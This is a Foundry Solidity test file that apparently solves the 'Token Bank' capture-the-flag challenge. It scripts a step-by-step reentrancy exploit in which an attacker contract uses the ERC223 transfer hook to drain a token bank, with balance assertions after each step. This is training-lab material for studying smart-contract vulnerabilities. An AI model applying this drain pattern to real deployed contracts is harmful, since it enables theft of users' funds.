// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "../src/TokenBank.sol";

import {console} from "forge-std/console.sol";

import {SimpleERC223Token} from "../src/TokenBank.sol";

contract TankBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;

    TokenBankAttacker public tokenBankAttacker;

    //Assume I have control over player?

    address player = address(1234);

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);

        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));

        // Put your solution here

        uint256 amount = 500_000 * 10 ** 18;

        SimpleERC223Token token = tokenBankChallenge.token();

        vm.label(player, "player");

        vm.label(address(tokenBankChallenge), "Bank Contract");

        vm.label(address(tokenBankAttacker), "Attacker");

        vm.label(address(token), "Token Contract");

        vm.label(address(this), "Deployer"); // understood that this is the Test Contract's address

        //Set Token

        vm.startPrank(player);

        tokenBankAttacker.setToken(address(token));

        vm.stopPrank();

        // Beginning State:

        // Token Contract Balance:

        // TokenBank: 1_000

        // Attacker : 0

        // player :0

        // Bank Contract Balance:

        // Deployer: 500

        // player: 500

        console.log("begin");

        assertEq(token.balanceOf(address(tokenBankChallenge)), amount * 2);

        assertEq(token.balanceOf(address(tokenBankAttacker)), 0);

        assertEq(token.balanceOf(player), 0);

        assertEq(tokenBankChallenge.balanceOf((address(this))), amount);

        assertEq(tokenBankChallenge.balanceOf(player), amount);

        // Step 1: As player withdraw tokens

        console.log("Step 1: As player, withdraw tokens");

        vm.startPrank(player);

        tokenBankChallenge.withdraw(amount);

        vm.stopPrank();

        // Token Contract Balance:

        // Deployer: 0

        // TokenBank: 500

        // Attacker : 0

        // player :500

        assertEq(token.balanceOf(address(this)), 0);

        assertEq(token.balanceOf(address(tokenBankChallenge)), amount);

        assertEq(token.balanceOf(address(tokenBankAttacker)), 0);

        assertEq(token.balanceOf(player), amount);

        // Bank Contract Balance:

        // Deployer: 500

        // Bank Contract: 0

        // player: 0

        assertEq(tokenBankChallenge.balanceOf((address(this))), amount);

        assertEq(tokenBankChallenge.balanceOf(address(tokenBankChallenge)), 0);

        assertEq(tokenBankChallenge.balanceOf(player), 0);

        // Step 2: Player Transfer Tokens to Attacker Contract

        console.log("Step2: Player Transfer tokens to Attacker");

        vm.startPrank(player);

        token.transfer(address(tokenBankAttacker), amount);

        vm.stopPrank();

        // Token Contract Balance:

        // Deployer:0

        // TokenBank: 500

        // Attacker : 500

        // player:0

        assertEq(token.balanceOf(address(this)), 0);

        assertEq(token.balanceOf(address(tokenBankChallenge)), amount);

        assertEq(token.balanceOf(address(tokenBankAttacker)), amount);

        assertEq(token.balanceOf(player), 0);

        // Bank Contract Balance:

        // Deployer: 500

        // Bank Contract: 0

        // Attacker: 0

        // player: 0

        assertEq(tokenBankChallenge.balanceOf((address(this))), amount);

        assertEq(tokenBankChallenge.balanceOf(address(tokenBankChallenge)), 0);

        assertEq(tokenBankChallenge.balanceOf(address(tokenBankAttacker)), 0);

        assertEq(tokenBankChallenge.balanceOf(player), 0);

        //Step 3: As Player, use Attacker to transfer tokens to Bank Contract

        console.log("Step3, use Attacker to transfer tokens to Bank Contract");

        vm.startPrank(player); //I'm aware it makes no diff, but its for realism purposes

        tokenBankAttacker.depositIntoBank(address(tokenBankChallenge), amount);

        //Token Contract Balance:

        // Deployer:0

        // Bank Contract:1_000

        // Attacker: 0

        // player: 0

        assertEq(token.balanceOf(address(this)), 0);

        assertEq(token.balanceOf(address(tokenBankChallenge)), amount * 2);

        assertEq(token.balanceOf(address(tokenBankAttacker)), 0);

        assertEq(token.balanceOf(player), 0);

        //Bank Contract Balance:

        // Deployer: 500

        // Bank Contract: 0;

        // Attacker: 500

        // player:0

        assertEq(tokenBankChallenge.balanceOf((address(this))), amount);

        assertEq(tokenBankChallenge.balanceOf(address(tokenBankChallenge)), 0);

        assertEq(tokenBankChallenge.balanceOf(address(tokenBankAttacker)), amount);

        assertEq(tokenBankChallenge.balanceOf(player), 0);

        vm.stopPrank();

        console.log("Step4: use Attacker to withdraw from Bank Contract");

        //Step 4: As Player, use Attacker to withdraw

        // -> Step into the hook baby

        vm.startPrank(player);

        tokenBankAttacker.attack(amount);

        vm.stopPrank();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }
}
